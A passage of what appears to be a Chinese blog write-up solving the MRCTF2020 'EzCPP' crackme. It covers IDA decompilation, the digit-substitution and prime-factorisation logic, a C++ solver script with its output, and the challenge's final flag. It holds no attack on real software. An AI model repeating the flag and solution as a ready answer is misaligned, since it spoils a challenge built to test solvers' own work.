class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;spdlog::details::log_msg_buffer <span class="type">const</span>*,std::vector&lt;spdlog::details::log_msg_buffer&gt;&gt;(</span><br><span class="line">            (<span class="type">const</span> __gnu_cxx::__normal_iterator&lt;<span class="type">const</span> std::shared_ptr&lt;sio::message&gt;*,std::vector&lt;std::shared_ptr&lt;sio::message&gt;&gt; &gt; *)&amp;v16,</span><br><span class="line">            (<span class="type">const</span> __gnu_cxx::__normal_iterator&lt;<span class="type">const</span> std::shared_ptr&lt;sio::message&gt;*,std::vector&lt;std::shared_ptr&lt;sio::message&gt;&gt; &gt; *)&amp;v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = *(_DWORD *)__gnu_cxx::__normal_iterator&lt;<span class="type">int</span> *,std::vector&lt;<span class="type">int</span>&gt;&gt;::<span class="keyword">operator</span>*(&amp;v16);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v23);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v14, &amp;unk_500E, &amp;v23);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v23);</span><br><span class="line">    <span class="built_in">depart</span>(v25, (__int64)v14);</span><br><span class="line">    &#123;<span class="built_in">lambda</span>(std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt; &amp;)#<span class="number">1</span>&#125;::<span class="built_in">operator</span>()(</span><br><span class="line">      (__int64)&amp;func,</span><br><span class="line">      (__int64)v14);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v24, v14);</span><br><span class="line">    v6 = !&#123;<span class="built_in">lambda</span>(std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;,<span class="type">int</span>)#<span class="number">2</span>&#125;::<span class="built_in">operator</span>()(</span><br><span class="line">            (__int64)&amp;check,</span><br><span class="line">            (__int64)v24,</span><br><span class="line">            v31);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v24);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Wrong password!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v31;</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v14);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">unsigned</span> <span class="type">int</span> *,std::vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt;&gt;::<span class="keyword">operator</span>++(&amp;v16);</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;right!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;flag:MRCTF&#123;md5(&quot;</span>);</span><br><span class="line">  v10 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>&gt;(v9, v18);</span><br><span class="line">  v11 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v10, <span class="string">&quot;)&#125;&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v12 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">          &amp;std::cout,</span><br><span class="line">          <span class="string">&quot;md5()-&gt;&#123;32/upper case/put the string into the function and transform into md5 hash&#125;&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v12, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v18);</span><br><span class="line">  std::vector&lt;<span class="type">bool</span>&gt;::~<span class="built_in">vector</span>(v19);</span><br><span class="line">  std::__cxx1998::vector&lt;<span class="type">double</span>,std::allocator&lt;<span class="type">double</span>&gt;&gt;::~<span class="built_in">vector</span>((std::vector&lt;std::shared_ptr&lt;sio::message&gt;&gt; *<span class="type">const</span>)v20);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中甚至都有分配器allocator实例的创建,还有析构函数的调用,真的是废话</p>
<p>ida有时候为同一对象创建了好多副本,但是实际上都是只读访问的副本,根本没有必要创建</p>
<p>甚至有的副本创建了根本不访问</p>
<p>为啥ida有时候显得很呆?</p>
<p>他只是刻板地按照堆栈中存在过的局部变量,决定创建或者不创建一个对象,它没法确定后来有没有使用这个对象,或者是否只是只读访问这个对象</p>
<h4 id="main翻译成人话">main翻译成人话</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">    string <span class="keyword">final</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;give me your key!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; keys[i];</span><br><span class="line">        <span class="keyword">final</span> += <span class="built_in">to_string</span>(keys[i]);</span><br><span class="line">        v.<span class="built_in">push_back</span>(keys[i] ^ <span class="number">1</span>);<span class="comment">//放到向量v里面的是输入与1的按位异或</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">length</span>(); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp;</span><br><span class="line">        <span class="built_in">depart</span>(v[i], temp);</span><br><span class="line"></span><br><span class="line">        将temp中的一些字符换掉</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (temp和ans[i] 字符串不相同)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;wrong password!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;right!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;flag:MRCTF&#123;md5(&quot;</span> &lt;&lt; <span class="keyword">final</span> &lt;&lt; <span class="string">&quot;)&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;md5()-&gt;&#123;32/upper case/put the string into the function and transform into md5 hash&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键点在于三个<code>lambda</code>和一个<code>depart</code></p>
<h4
id="第一个lambda已经翻译成人话了就是一个keysi1">第一个lambda已经翻译成人话了,就是一个<code>keys[i]^1</code></h4>
<h4
id="第二个lambda已经翻译成汉字了将temp中的一些字符换掉">第二个lambda已经翻译成汉字了,"将temp中的一些字符换掉"</h4>
<blockquote>
<p>具体的更换规则</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall &#123;lambda(<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt; &amp;)#<span class="number">1</span>&#125;::operator()(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">	将a2中的原数-&gt;新数</span><br><span class="line">	<span class="number">48</span>-&gt;<span class="number">79</span> 		<span class="number">0</span>-&gt;O</span><br><span class="line"> 	<span class="number">49</span>-&gt;<span class="number">108</span>		 <span class="number">1</span>-&gt;l</span><br><span class="line">  	<span class="number">50</span>-&gt;<span class="number">122</span>		<span class="number">2</span>-&gt;z</span><br><span class="line">	<span class="number">51</span>-&gt;<span class="number">69</span> 		<span class="number">3</span>-&gt;E</span><br><span class="line"> 	<span class="number">52</span>-&gt;<span class="number">65</span> 		<span class="number">4</span>-&gt;A</span><br><span class="line"> 	<span class="number">53</span>-&gt;<span class="number">115</span>		 <span class="number">5</span>-&gt;s</span><br><span class="line">	<span class="number">54</span>-&gt;<span class="number">71</span> 		<span class="number">6</span>-&gt;G</span><br><span class="line">	<span class="number">55</span>-&gt;<span class="number">84</span> 		<span class="number">7</span>-&gt;T</span><br><span class="line">	<span class="number">56</span>-&gt;<span class="number">66</span> 		<span class="number">8</span>-&gt;B</span><br><span class="line">	<span class="number">57</span>-&gt;<span class="number">113</span> 		<span class="number">9</span>-&gt;q</span><br><span class="line">	<span class="number">32</span>-&gt;<span class="number">61</span> 		空格-&gt;等号=</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>第三个<code>lambda</code>也翻译成汉字了"<code>temp</code>和<code>ans[i]</code>字符串不相同",这个就是判断条件</p>
<blockquote>
<p><code>ans[i]</code>是程序每次都会自动初始化好的,应该是全局位置的string数组,</p>
<p>这个数组的初始化在哪里看呢?</p>
<p>跟踪这个lambda表达式</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727215518968.png"
alt="image-20220727215518968" />
<figcaption aria-hidden="true">image-20220727215518968</figcaption>
</figure>
<p>继续跟踪这个ans数组</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727215551499.png"
alt="image-20220727215551499" />
<figcaption aria-hidden="true">image-20220727215551499</figcaption>
</figure>
<p>发现他在bss段,按下ctrl+x观察交叉引用,发现有一个<code>__static_initialization_and_destruction_0</code>函数引用过该数组,追踪该函数,其中有:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">std::ios_base::Init::<span class="built_in">Init</span>((std::ios_base::Init *)&amp;std::__ioinit);</span><br><span class="line">    __cxa_atexit((<span class="built_in">void</span> (__fastcall *)(<span class="type">void</span> *))&amp;std::ios_base::Init::~Init, &amp;std::__ioinit, &amp;_dso_handle);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v3);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(</span><br><span class="line">      &amp;ans[abi:cxx11],</span><br><span class="line">      <span class="string">&quot;=zqE=z=z=z&quot;</span>,</span><br><span class="line">      &amp;v3);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v3);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v4);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(</span><br><span class="line">      (<span class="type">char</span> *)&amp;ans[abi:cxx11] + <span class="number">32</span>,</span><br><span class="line">      <span class="string">&quot;=lzzE&quot;</span>,</span><br><span class="line">      &amp;v4)</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v4);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(</span><br><span class="line">      (<span class="type">char</span> *)&amp;ans[abi:cxx11] + <span class="number">64</span>,</span><br><span class="line">      <span class="string">&quot;=ll=T=s=s=E&quot;</span>,</span><br><span class="line">      &amp;v5);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>相当于</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> ans[<span class="number">9</span>] = &#123;</span><br><span class="line"> <span class="string">&quot;=zqE=z=z=z&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=lzzE&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=ll=T=s=s=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=zATT&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=s=s=s=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=EOll=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=lE=T=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=EsE=s=z&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=AT=lE=ll&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>于是就得到了ans数组,后面的工作就是从ans数组开始反回去</p>
</blockquote>
<h4 id="departvi-temp"><code>depart(v[i], temp);</code></h4>
<p><code>depart</code>函数干了啥事呢?将<code>v[i]</code>分解质因数,然后按照从大到小的顺序,放到<code>temp</code>字符串里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">depart</span><span class="params">(<span class="type">int</span> a1, <span class="built_in">string</span> &amp;s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; <span class="built_in">sqrt</span>(a1) &gt;= i; ++i) <span class="comment">// i从2根号a1,遍历求a1的乘法因子</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((a1 % i) == <span class="number">0</span>)</span><br><span class="line">        &#123;                      <span class="comment">//当a1%i能够除开则i是a1的除法因子</span></span><br><span class="line">            depart(a1 / i, s); <span class="comment">// a1中去掉刚刚找到的乘法因子i,然后继续寻找剩下的乘法银子</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s = s + <span class="string">&quot; &quot;</span> + to_string(v6); <span class="comment">//由于最深处的递归函数首先执行本行,因此,最大的因子最先添加到a2上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解密脚本">解密脚本</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string ans[<span class="number">11</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;=zqE=z=z=z&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=lzzE&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=ll=T=s=s=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=zATT&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=s=s=s=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=EOll=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=lE=T=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=EsE=s=z&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=AT=lE=ll&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change</span><span class="params">(string &amp;str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">length</span>(); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (str[i])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;5&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;6&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;8&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">calc</span><span class="params">(<span class="type">const</span> string &amp;str)</span></span>&#123;</span><br><span class="line">    string temp;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;str.<span class="built_in">length</span>();++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            ans*=<span class="built_in">stoi</span>(temp);</span><br><span class="line">            temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            temp+=str[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans*=<span class="built_in">stoi</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">change</span>(ans[i]);</span><br><span class="line">        cout&lt;&lt;(<span class="built_in">calc</span>(ans[i])^<span class="number">1</span>)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\MRCTF2020\EzCPP&gt; ./test</span><br><span class="line"><span class="number">2345</span></span><br><span class="line"><span class="number">1222</span></span><br><span class="line"><span class="number">5774</span></span><br><span class="line"><span class="number">2476</span></span><br><span class="line"><span class="number">3374</span></span><br><span class="line"><span class="number">9032</span></span><br><span class="line"><span class="number">2456</span></span><br><span class="line"><span class="number">3531</span></span><br><span class="line"><span class="number">6720</span></span><br></pre></td></tr></table></figure>
<p>Linux虚拟机或者wsl上运行EasyCPP然后把keys乎进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/MRCTF2020/EzCPP]</span><br><span class="line">└─# ./EasyCPP</span><br><span class="line">give me your key!</span><br><span class="line"><span class="number">2345</span></span><br><span class="line"><span class="number">1222</span></span><br><span class="line"><span class="number">5774</span></span><br><span class="line"><span class="number">2476</span></span><br><span class="line"><span class="number">3374</span></span><br><span class="line"><span class="number">9032</span></span><br><span class="line"><span class="number">2456</span></span><br><span class="line"><span class="number">3531</span></span><br><span class="line"><span class="number">6720</span></span><br><span class="line">right!</span><br><span class="line">flag:MRCTF&#123;md5(<span class="number">234512225774247633749032245635316720</span>)&#125;</span><br><span class="line">md5()-&gt;&#123;<span class="number">32</span>/upper <span class="keyword">case</span>/put the <span class="built_in">string</span> into the function and transform into md5 hash&#125;</span><br><span class="line">sh: <span class="number">1</span>: pause: not found</span><br></pre></td></tr></table></figure>
<p>32位大写的md5加密:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4367F</span>B5F42C6E46B2AF79BF409FB84D3</span><br></pre></td></tr></table></figure>
<p>因此flag是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;4367FB5F42C6E46B2AF79BF409FB84D3&#125;</span><br></pre></td></tr></table></figure>
<p>交到buuctf上是</p>
